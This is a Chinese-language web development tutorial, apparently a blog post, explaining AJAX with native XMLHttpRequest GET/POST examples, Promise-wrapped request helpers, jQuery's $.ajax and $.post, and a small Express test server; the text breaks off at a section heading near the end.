        <content type="html"><![CDATA[<blockquote><p>参考文档：<a href="https://www.runoob.com/ajax/ajax-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a>，本教程后端基于node.js下进行，结合b站多个学习教程以及菜鸟教程进行记录，包括ajax简介以及原生ajax、promise封装版ajax和jQuery版ajax的实现方式以及部分参数的含义，最后会讲到数组reduce函数的相关内容以及对跨域问题的总结，本文章有ES6语法，需要的基础知识：nodejs、express、ES6、promise以及jQuery</p></blockquote><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><ul><li>异步的JavaScript 和 XML<ol><li>异步：客户端无需等待服务器端的响应，在等待服务器处理请求的过程中，客户端可以做其它事情</li><li>同步：客户端必须等待服务器端处理用户请求并完成后才能继续做其它操作</li></ol></li><li>AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）</li><li>AJAX 不是新的编程语言，而是一种使用现有标准的新方法</li><li>AJAX 最大的优点是在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容</li><li>AJAX 不需要任何浏览器插件，但需要用户允许JavaScript在浏览器上执行。</li></ul><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li><p>AJAX = 异步 JavaScript 和 XML。</p></li><li><p>AJAX 是一种用于创建快速动态网页的技术。</p></li><li><p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。</p><blockquote><p>异步更新：可以在不重新加载整个页面的情况下对网页某个部分实现更新</p></blockquote></li><li><p>传统的网页（不使用 AJAX）如果需要更新内容，必须重载整个网页。</p></li><li><p>ajax工作图</p><img src= "/img/loading.gif" data-src="/2020/07/20/AJAX/ajax.png" alt="ajax"></li><li><p>AJAX是基于现有的Internet标准</p></li><li><p>🔺AJAX应用程序与浏览器和平台无关的！</p></li></ul><h1 id="原生AJAX"><a href="#原生AJAX" class="headerlink" title="原生AJAX"></a>原生AJAX</h1><p>服务器需先搭建好，方便进行调试</p><p>大致格式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="comment">//原生获取post请求体</span></span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;))</span><br><span class="line"><span class="comment">//开饭静态资源</span></span><br><span class="line">app.use(<span class="string">'/views/'</span>, express.static(<span class="string">'./views/'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//get请求</span></span><br><span class="line">app.get(<span class="string">'/get/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">'服务器收到请求了'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(req.query)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//post请求</span></span><br><span class="line">app.post(<span class="string">'/post/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">'服务器收到请求了'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(req.body)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//开放端口号</span></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server is running'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="版本一"><a href="#版本一" class="headerlink" title="版本一"></a>版本一</h2><p>大体ajax结构类似，基本分为四步</p><ol><li>创建ajax对象</li><li>告诉Ajax对象要向哪发送请求，以什么方式发送请求1)请求方式 2)请求地址</li><li>发送请求</li><li>获取服务器端响应到客户端的数据(异步)</li></ol><blockquote><p>若需获得来自服务器的响应，使用 XMLHttpRequest 对象的 responseText 或 responseXML 属性。</p><ul><li><p>responseText  获得字符串形式的响应数据。 </p></li><li><p>responseXML  获得 XML 形式的响应数据。</p></li></ul></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"../public/index.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"a"</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 1.创建ajax对象</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 2.告诉Ajax对象要向哪发送请求，以什么方式发送请求</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 1)请求方式 2)请求地址：必须以文件形式访问，否则会产生跨域问题</span></span></span><br><span class="line"><span class="actionscript">    xhr.open(<span class="string">'get'</span>, <span class="string">'http://192.168.1.103:3000/index'</span>)</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 3.发送请求</span></span></span><br><span class="line">    xhr.send();</span><br><span class="line"><span class="actionscript">    <span class="comment">// 4.获取服务器端响应到客户端的数据(异步)</span></span></span><br><span class="line"><span class="actionscript">    xhr.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(xhr.responseText)</span></span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="版本二"><a href="#版本二" class="headerlink" title="版本二"></a>版本二</h2><p>步骤</p><ol><li><p>实例化xhq对象（<code>XMLHttpRequest</code>）</p></li><li><p>绑定事件监听（<code>.onreadystatechange()</code>）</p></li><li><p>设置发送请求的方式、地址、参数（<code>.open()</code>）</p></li><li><p>发送请求（.send()）</p></li></ol><blockquote><p>GET 还是POST</p><p>与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。</p><p>在以下情况中，请使用 POST 请求：</p><ul><li>无法使用缓存文件（更新服务器上的文件或数据库）</li><li>向服务器发送大量数据（POST 没有数据量限制）</li><li>发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</li><li>发送需保证安全的数据时</li></ul></blockquote><h3 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>原生AJAX GET请求<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"get"</span>&gt;</span>我是原生get请求，你来点我啊<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"ul"</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">'#get'</span>)</span></span><br><span class="line">    </span><br><span class="line"><span class="actionscript">    <span class="comment">//----------AJAX-----------------</span></span></span><br><span class="line"><span class="actionscript">    btn.onclick = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//实例化XMLHttpRequest对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//绑定注册事件onreadystatechange</span></span></span><br><span class="line"><span class="actionscript">        xhr.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line">            if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(xhr)</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> ul = <span class="built_in">document</span>.querySelector(<span class="string">'ul'</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">'li'</span>)</span></span><br><span class="line">                li.innerHTML = xhr.response</span><br><span class="line">                ul.appendChild(li)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">//指定发送请求的方式、地址、参数,t = Date.now()解决IE浏览器强缓存不随服务器刷新问题</span></span></span><br><span class="line"><span class="javascript">        xhr.open(<span class="string">'get'</span>, <span class="string">"http://192.168.1.103:3000/get?name=猪头&amp;age=18&amp;t="</span>+ <span class="built_in">Date</span>.now())</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//发送请求</span></span></span><br><span class="line">        xhr.send()</span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="comment">//---------------AJAX结束-----------------   </span></span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><p>open() 方法的 <em>url</em> 参数 - 服务器文件地址</p></li><li><p>open() 方法的 async 参数（也就是最后一个）是说明发送的请求同步还是异步 ，true为异步，false为同步</p></li><li><p>onreadystatechange 事件中包含了三个属性，有必要阅读以及了解下这三个属性的含义以及特点，链接地址： <a href="https://www.runoob.com/ajax/ajax-xmlhttprequest-onreadystatechange.html" target="_blank" rel="noopener">onreadystatechange 事件</a> </p></li></ul></blockquote><h3 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h3><p>post请求类似get，<strong>但需增加一个设置请求体请求头</strong>（容易忘记），以及将请求体内容作为参数写在<code>send()</code>里，从而让服务端的中间件解析pot请求体（下面只放js代码）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">'#get'</span>)</span></span><br><span class="line"><span class="actionscript">    btn.onclick = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span></span><br><span class="line"><span class="actionscript">        xhr.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// console.log(1)</span></span></span><br><span class="line">            if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">'xhr.response'</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">'post'</span>, <span class="string">'http://192.168.1.103:3000/post'</span>)</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//🔺一定要注意设置请求体请求头！！！！！！！！！！</span></span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">'content-type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>)</span></span><br><span class="line"><span class="actionscript">        xhr.send(<span class="string">'name=猪头&amp;age=18'</span>)</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="封装原生AJAX方法（Promise）"><a href="#封装原生AJAX方法（Promise）" class="headerlink" title="封装原生AJAX方法（Promise）"></a>封装原生AJAX方法（Promise）</h1><h2 id="版本一-1"><a href="#版本一-1" class="headerlink" title="版本一"></a>版本一</h2><p>涉及需掌握的内容</p><ol><li>数组<code>reduce</code>方法</li><li>对象转数组 <code>Object.keys(&#39;要转的数组&#39;)</code></li><li>转小写 <code>.toLowerCase()</code></li><li>错误对象 <code>new Error()</code></li><li>nodejs后台搭建</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>使用Promise封装原生Ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>该页面使用Promise封装了原生Ajax<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn1"</span>&gt;</span>点我发送GET请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn2"</span>&gt;</span>点我发送POST请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> btn1 = <span class="built_in">document</span>.getElementById(<span class="string">'btn1'</span>)</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> btn2 = <span class="built_in">document</span>.getElementById(<span class="string">'btn2'</span>)</span></span><br><span class="line">  </span><br><span class="line"><span class="actionscript">  btn1.onclick = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    sendAjax(<span class="string">'http://localhost:3000/test_get'</span>,<span class="string">'GET'</span>,&#123;<span class="attr">m</span>:<span class="number">1</span>,<span class="attr">n</span>:<span class="number">2</span>&#125;).then(<span class="function">(<span class="params">data</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(data)</span></span><br><span class="line"><span class="javascript">    &#125;).catch(<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(err)</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line"><span class="actionscript">  btn2.onclick = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    sendAjax(<span class="string">'http://localhost:3000/test_post'</span>,<span class="string">'POST'</span>,&#123;<span class="attr">m</span>:<span class="number">3</span>,<span class="attr">n</span>:<span class="number">4</span>&#125;).then(<span class="function">(<span class="params">data</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(data)</span></span><br><span class="line"><span class="javascript">    &#125;).catch(<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(err)</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">sendAjax</span><span class="params">(url,method,data)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//1.创建xhr对象</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//2.绑定监听</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(a)</span></span><br><span class="line"><span class="actionscript">      xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line">        if(xhr.readyState !== 4)&#123;</span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span></span></span><br><span class="line">        &#125;</span><br><span class="line">        if(xhr.readyState === 4 &amp;&amp; (xhr.status &gt;= 200 &amp;&amp; xhr.status&lt;= 299))&#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">const</span> responseObj = &#123;</span></span><br><span class="line">              data:xhr.response,</span><br><span class="line">              status:xhr.status,</span><br><span class="line">              statusText:xhr.statusText</span><br><span class="line">            &#125;</span><br><span class="line">            resolve(responseObj)</span><br><span class="line"><span class="actionscript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">            reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'请求出错了'</span>))</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="actionscript">      <span class="comment">//3.设置请求的方式，地址，携带的参数</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> dataKeys = <span class="built_in">Object</span>.keys(data)</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//4.将传递过来的数据对象加工成urlencoded形式的编码</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> str = dataKeys.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">pre,now</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> pre+=<span class="string">`<span class="subst">$&#123;now&#125;</span>=<span class="subst">$&#123;data[now]&#125;</span>&amp;`</span></span></span><br><span class="line"><span class="actionscript">      &#125;,<span class="string">''</span>)</span></span><br><span class="line"><span class="actionscript">      <span class="comment">//5.发送请求</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">if</span>(method.toLowerCase() === <span class="string">'get'</span>)&#123;</span></span><br><span class="line"><span class="javascript">        url += <span class="string">`?<span class="subst">$&#123;str&#125;</span>`</span></span></span><br><span class="line">        xhr.open(method,url)</span><br><span class="line">        xhr.send()</span><br><span class="line"><span class="actionscript">      &#125;<span class="keyword">else</span> <span class="keyword">if</span> (method.toLowerCase() === <span class="string">'post'</span>)&#123;</span></span><br><span class="line">        xhr.open(method,url)</span><br><span class="line"><span class="actionscript">          <span class="comment">//post添加请求头</span></span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">'content-type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>)</span></span><br><span class="line">        xhr.send(str)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="版本二-1"><a href="#版本二-1" class="headerlink" title="版本二"></a>版本二</h2><p>仿照JQuery的<code>$.get(‘url’).then</code>结合Promise进行设计，只能get</p><p>下面只放出js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pGet</span>(<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> oReq = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">       <span class="comment">// 当请求加载成功之后要调用指定的函数，这里使用onload()方法</span></span><br><span class="line">       oReq.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="comment">// 我现在需要得到这里的 oReq.responseText，注意&amp;&amp;的使用</span></span><br><span class="line">         callback &amp;&amp; callback(<span class="built_in">JSON</span>.parse(oReq.responseText))</span><br><span class="line">         resolve(<span class="built_in">JSON</span>.parse(oReq.responseText)) <span class="comment">//进行格式转换</span></span><br><span class="line">       &#125;</span><br><span class="line">       oReq.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">         reject(err)</span><br><span class="line">       &#125;</span><br><span class="line">       oReq.open(<span class="string">"get"</span>, url, <span class="literal">true</span>)</span><br><span class="line">       oReq.send()</span><br><span class="line">     &#125;)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>实现方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pGet(<span class="string">'http://127.0.0.1:3000/users/4'</span>)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><h1 id="JQuery中的AJAX"><a href="#JQuery中的AJAX" class="headerlink" title="JQuery中的AJAX"></a>JQuery中的AJAX</h1><h2 id="标准版（提倡使用）"><a href="#标准版（提倡使用）" class="headerlink" title="标准版（提倡使用）"></a>标准版（提倡使用）</h2><p>假设需要获取一个id为register_form的表单请求体数据，使用以下代码，下面有各个参数说明</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $(<span class="string">'#register_form'</span>).on(<span class="string">'submit'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">   e.preventDefault()</span><br><span class="line">   <span class="keyword">var</span> formData = $(<span class="keyword">this</span>).serialize() <span class="comment">//序列化表单值</span></span><br><span class="line">   $.ajax(&#123;</span><br><span class="line">     url: <span class="string">'/register'</span>,</span><br><span class="line">     type: <span class="string">'post'</span>,</span><br><span class="line">     data: formData, <span class="comment">//表单请求数据</span></span><br><span class="line">     dataType: <span class="string">'json'</span>, <span class="comment">//返回的数据类型</span></span><br><span class="line">     success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"><span class="comment">//成功执行函数，data为服务端响应数据</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br></pre></td></tr></table></figure><h2 id="简化版"><a href="#简化版" class="headerlink" title="简化版"></a>简化版</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  $.post(<span class="string">'http://localhost:3000/test_post'</span>,&#123;<span class="attr">name</span>:<span class="string">'kobe'</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,(data)=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="配合Promise使用"><a href="#配合Promise使用" class="headerlink" 